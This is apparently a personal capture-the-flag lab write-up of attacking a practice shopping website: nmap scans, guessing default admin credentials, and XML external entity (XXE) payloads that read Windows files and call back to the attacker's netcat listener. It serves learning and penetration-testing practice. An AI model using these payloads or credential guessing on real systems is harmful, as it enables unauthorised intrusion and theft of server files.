# 

|     Local    |     Remote     |
| ------------ | -------------- |
| 10.10.15.155 | 10.129.201.205 |
| 10.10.15.155 | 10.129.95.192  |

----

## Nmap
```
nmap 10.129.201.205        
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-21 20:07 EDT
Nmap scan report for 10.129.201.205
Host is up (0.043s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 4.66 seconds
```

```
# nmap -Pn -sS -sV -sC -O -p 22,80,443 10.129.201.205
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-21 20:10 EDT
Nmap scan report for 10.129.201.205
Host is up (0.042s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH for_Windows_8.1 (protocol 2.0)
| ssh-hostkey: 
|   3072 9f:a0:f7:8c:c6:e2:a4:bd:71:87:68:82:3e:5d:b7:9f (RSA)
|   256 90:7d:96:a9:6e:9e:4d:40:94:e7:bb:55:eb:b3:0b:97 (ECDSA)
|_  256 f9:10:eb:76:d4:6d:4f:3e:17:f3:93:d6:0b:8c:4b:81 (ED25519)
80/tcp  open  http     Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.2.28)
|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28
|_http-title: MegaShopping
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
443/tcp open  ssl/http Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.2.28)
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28
|_http-title: MegaShopping
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_ssl-date: TLS randomness does not represent time
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019 (88%)
Aggressive OS guesses: Microsoft Windows Server 2019 (88%)
No exact OS matches for host (test conditions non-ideal).

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.83 seconds
```

## Guessed the login creds
1. Searched Google for "default login credentials" and started trying the pairs.
2. Works: admin/password

## XML
One of the pages in the website (Order) uses XML to tranfer form data to the server.
- Use BurpSuite to capture the posting of the form data:
```
POST /process.php HTTP/1.1
Host: 10.129.95.192
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: text/xml
Content-Length: 141
Origin: http://10.129.95.192
Connection: keep-alive
Referer: http://10.129.95.192/services.php
Cookie: PHPSESSID=hmh2uk62nc3m8gmg5knr3n7g3j

<?xml version = "1.0"?>
  <order>
    <quantity>2</quantity>
    <item>Home Appliances</item>
    <address>This is from the address form box.</address>
  </order>
```

We are interested in the bottom portion: `<?xml version = "1.0"?>`

## Google Search

Searched on "xml website vulnerabilities". The first result had this:
- XML External Entity (XXE or XEE) vulnerabilities are a type of security vulnerability that allow attackers to exploit the XML parser functionality in web applications.
- These vulnerabilities occur when an application accepts XML input from untrusted sources without proper validation and processing.

The second result was from the [OWASP site](https://cheatsheetseries.owasp.org/cheatsheets/XML_Security_Cheat_Sheet.html).

## Exploiting XXE/XEE

Google Search on "exploiting xxe". The first result was from PortSwigger (makers of BurpSuite).
- XML external entity injection (also known as XXE) is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data.
- It often allows an attacker to view files on the application server filesystem, and to interact with any back-end or external systems that the application itself can access.
- In some situations, an attacker can escalate an XXE attack to compromise the underlying server or other back-end infrastructure, by leveraging the XXE vulnerability to perform server-side request forgery (SSRF) attacks. 

### [Exploiting XXE to retrieve files](https://portswigger.net/web-security/xxe#exploiting-xxe-to-retrieve-files)

To perform an XXE injection attack that retrieves an arbitrary file from the server's filesystem, you need to modify the submitted XML in two ways:
1. Introduce (or edit) a `DOCTYPE` element that defines an external entity containing the path to the file.
2. Edit a data value in the XML that is returned in the application's response, to make use of the defined external entity.

Using our XML data from above: 
```
<?xml version = "1.0"?>
  <order>
    <quantity>2</quantity>
    <item>Home Appliances</item>
    <address>This is from the address form box.</address>
  </order>
```

If the application performs no particular defenses against XXE attacks, we can exploit the XXE vulnerability and retrieve the `/etc/passwd` file (if Linux) or a similarly common file (if Windows):
- The XXE payload defines an external entity `&xxe;` whose value is the contents of the `/etc/passwd` file and uses the entity within the `quantity` value. This causes the application's response to include the contents of the file:
- Use BurpSuite's Repeater to send this code to the server:
```
<?xml version = "1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:\Windows\win.ini"> ]>
<order>
  <quantity>&xxe;</quantity>
  <item>Home Appliances</item>
  <address>This is from the address form box.</address>
</order>
```

Didn't work. Tweaked it to this: 
```
<?xml version = "1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini"> ]>
<order>
  <quantity>&xxe;</quantity>
  <item>Home Appliances</item>
  <address>This is from the address form box.</address>
</order>
```

Didn't work. 

Googled: "xxe test windows machine"
- [Found this](https://medium.com/@canavaroxum/xxe-on-windows-system-then-what-76d571d66745). He used the following code with a netcat listener waiting on the attack machine:
```
<?xml version = "1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY> 
  <!ENTITY xxe SYSTEM "http://10.10.15.155:1234">]>
<foo>&xxe;</foo>
```
That resulted in this on my listener (showing the server is vulnerable to XXE): 
```
# nc -nvlp 1234
listening on [any] 1234 ...
connect to [10.10.15.155] from (UNKNOWN) [10.129.95.192] 49695
GET / HTTP/1.0
Host: 10.10.15.155:1234
Connection: close
```

[Note from the original site](https://portswigger.net/web-security/xxe#exploiting-xxe-to-retrieve-files): 
- With real-world XXE vulnerabilities, there will often be a large number of data values within the submitted XML, any one of which might be used within the application's response. To test systematically for XXE vulnerabilities, you will generally need to test each data node in the XML individually, by making use of your defined entity and seeing whether it appears within the response.

### Walk-Through: Correct Placement of the Variable

The walk-through for this machine has this: 
```
<?xml version = "1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE root [ <!ENTITY test SYSTEM 'file:///c:/windows/win.ini'> ]>
<order>
  <quantity>3</quantity>
  <item>&test;</item>
  <address>17th Estate, CA</address>
</order>
```

Note the placement: within the `item`tags.
- Putting the varible `test` in any other tag set does not work. 





